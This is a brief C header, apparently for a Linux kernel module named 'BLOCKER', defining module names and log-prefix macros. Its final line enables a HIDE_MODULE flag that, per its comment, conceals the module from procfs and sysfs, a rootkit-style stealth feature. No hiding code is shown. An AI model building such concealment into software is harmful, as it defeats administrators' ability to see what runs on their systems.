#define MODULE_NAME "BLOCKER"
#define DEV_NAME "BLOCKER"
#define MAJOR_NUM 0
#define SUBSTRING_INFO KERN_INFO MODULE_NAME ": "
#define SUBSTRING_WARNING KERN_WARNING MODULE_NAME ": "
#define SUBSTRING_ALERT KERN_WARNING MODULE_NAME ": "
#define SUBSTRING_DEBUG KERN_DEBUG MODULE_NAME ": "

// Delete the following line if you dont want to hide the kernel module from procfs and sysfs.
#define HIDE_MODULE
